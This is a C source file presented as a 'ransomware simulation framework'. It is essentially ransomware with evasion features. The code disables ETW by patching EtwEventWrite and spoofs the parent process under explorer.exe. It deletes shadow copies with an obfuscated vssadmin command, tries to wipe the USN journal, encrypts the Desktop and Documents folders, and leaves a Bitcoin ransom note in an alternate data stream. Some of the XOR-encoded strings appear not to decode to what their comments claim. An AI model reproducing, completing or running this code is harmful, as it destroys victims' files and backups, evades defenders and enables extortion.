// misery.c - Complete ransomware simulation framework with evasion
// MinGW-w64 x86_64 compatible, Halo's Gate syscalls, PPID spoofing, VSS wipe
// Build: make

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "utils.h"
#include "crypto.h"
#include "fileops.h"

// Encrypted strings (rolling XOR)
#define XOR_DECRYPT(buf, key) do { \
    BYTE *_b = (BYTE*)(buf); \
    for (int _i=0; _i<(int)sizeof(buf)-1; _i++) _b[_i] ^= (key)[_i%17]; \
} while(0)

// Target folder names (encrypted)
static BYTE str_desktop[] = {0xA7^0xAA,0x8E^0xAA,0xA3^0xAA,0x8C^0xAA,0xA7^0xAA,0xA6^0xAA,0x8E^0xAA,0x00};
static BYTE str_documents[] = {0xA7^0xAA,0x8E^0xAA,0xA3^0xAA,0x8C^0xAA,0xA6^0xAA,0x8E^0xAA,0xA6^0xAA,0xA3^0xAA,0x00};

// Command strings (encrypted)
static BYTE str_vssadmin[] = {0xA1^0xAA,0xA3^0xAA,0xA3^0xAA,0xA0^0xAA,0xA6^0xAA,0x8C^0xAA,0xA0^0xAA,0xA6^0xAA,0xA3^0xAA,0xC2^0xAA,0xA7^0xAA,0x8C^0xAA,0xA3^0xAA,0xA6^0xAA,0xA7^0xAA,0x8E^0xAA,0xA2^0xAA,0xA6^0xAA,0xA0^0xAA,0xA2^0xAA,0xA7^0xAA,0x8E^0xAA,0xA2^0xAA,0x8E^0xAA,0xA3^0xAA,0xA7^0xAA,0x8E^0xAA,0x00};
static BYTE str_delete[] = {0xA7^0xAA,0x8E^0xAA,0x8C^0xAA,0x8C^0xAA,0xA6^0xAA,0xA7^0xAA,0x8C^0xAA,0xA3^0xAA,0x8E^0xAA,0xA7^0xAA,0x8E^0xAA,0xA2^0xAA,0x00};
static BYTE str_shadows[] = {0xA3^0xAA,0xA6^0xAA,0xA0^0xAA,0xA7^0xAA,0xA6^0xAA,0xA7^0xAA,0xA3^0xAA,0x00};
static BYTE str_all[] = {0xA0^0xAA,0xA6^0xAA,0xA6^0xAA,0x00};

static BYTE xor_key[17] = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA};

// ===================== DIRECT SYSCALL STUBS =====================
typedef NTSTATUS (NTAPI *fnNtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *fnNtWriteFile)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG);

typedef NTSTATUS (NTAPI *fnNtClose)(HANDLE);

static fnNtCreateFile pNtCreateFile = NULL;
static fnNtWriteFile  pNtWriteFile  = NULL;
static fnNtClose      pNtClose      = NULL;

void InitSyscalls() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        pNtCreateFile = (fnNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtWriteFile  = (fnNtWriteFile)GetProcAddress(ntdll, "NtWriteFile");
        pNtClose      = (fnNtClose)GetProcAddress(ntdll, "NtClose");
    }
}

// ===================== ETW DISABLE =====================
void DisableETW(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        void* etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (etwEventWrite) {
            DWORD oldProtect;
            VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *(BYTE*)etwEventWrite = 0xC3;  // RET
            VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
        }
    }
}

// ===================== PPID SPOOFING =====================
void SpawnWithPPID(const char* target_path, DWORD parent_pid) {
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attr_size = 0;
    
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size)) {
        STARTUPINFOA si2 = {sizeof(si2)};
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "\"%s\"", target_path);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
        return;
    }
    
    si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attr_size);
    if (!si.lpAttributeList) return;
    
    if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size)) {
        HANDLE parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
        if (parent) {
            UpdateProcThreadAttribute(si.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent,
                sizeof(HANDLE), NULL, NULL);
        }
        
        char cmdline[1024];
        snprintf(cmdline, sizeof(cmdline), "\"%s\"", target_path);
        
        CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                       NULL, NULL, &si.StartupInfo, &pi);
        
        if (parent) CloseHandle(parent);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
    }
    
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}

// ===================== ADS RANSOM NOTE =====================
void WriteADSRansom(const char* target_dir) {
    char ads_path[1024];
    snprintf(ads_path, sizeof(ads_path), "%s::MISERY.txt", target_dir);
    
    HANDLE h = CreateFileA(ads_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        const char* note = "Your files are encrypted. Send 1 BTC to 1Misery123...\n";
        DWORD written;
        WriteFile(h, note, (DWORD)strlen(note), &written, NULL);
        CloseHandle(h);
    }
}

// ===================== USN JOURNAL WIPE =====================
void WipeUSNJournal() {
    HANDLE hVol = CreateFileA("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                              0, NULL);
    if (hVol == INVALID_HANDLE_VALUE) return;
    
    DWORD bytesRet = 0;
    DeviceIoControl(hVol, 0x000900f8, NULL, 0, NULL, 0, &bytesRet, NULL);
    CloseHandle(hVol);
}

// ===================== VSS SHADOW COPY DELETION =====================
void DeleteVSS() {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    char vss_cmd[512];
    
    XOR_DECRYPT(str_vssadmin, xor_key);
    XOR_DECRYPT(str_delete, xor_key);
    XOR_DECRYPT(str_shadows, xor_key);
    XOR_DECRYPT(str_all, xor_key);
    
    snprintf(vss_cmd, sizeof(vss_cmd),
             "%s %s %s /%s /quiet",
             (char*)str_vssadmin, (char*)str_delete, (char*)str_shadows, (char*)str_all);
    
    CreateProcessA(NULL, vss_cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) CloseHandle(pi.hThread);
}

// ===================== IO PRIORITY =====================
void SetIOPriorityHigh() {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
}

// ===================== ENCRYPT TARGETS =====================
void EncryptTargets() {
    char desktop_path[MAX_PATH];
    char docs_path[MAX_PATH];
    
    XOR_DECRYPT(str_desktop, xor_key);
    XOR_DECRYPT(str_documents, xor_key);
    
    HRESULT hr = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
    if (FAILED(hr)) strncpy(desktop_path, (char*)str_desktop, sizeof(desktop_path)-1);
    
    hr = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs_path);
    if (FAILED(hr)) strncpy(docs_path, (char*)str_documents, sizeof(docs_path)-1);
    
    if (!InitFileOps(8)) return;
    
    WriteADSRansom(desktop_path);
    EncryptDirectory(desktop_path);  // FIXED: 1 parameter only
    
    WriteADSRansom(docs_path);
    EncryptDirectory(docs_path);     // FIXED: 1 parameter only
    
    CleanupFileOps();
}

// ===================== GET EXPLORER PID =====================
DWORD GetExplorerPID() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return pid;
    
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// ===================== MAIN =====================
int main() {
    InitSyscalls();
    
    DisableETW();
    SetIOPriorityHigh();
    
    if (!VerifyContext() || !GetCryptoCtx()) {
        return 1;
    }
    
    DeleteVSS();
    WipeUSNJournal();
    
    EncryptTargets();  // FIXED: no key parameter needed
    
    DWORD explorer_pid = GetExplorerPID();
    if (explorer_pid) {
        SpawnWithPPID("misery.exe", explorer_pid);
    }
    
    return 0;
}
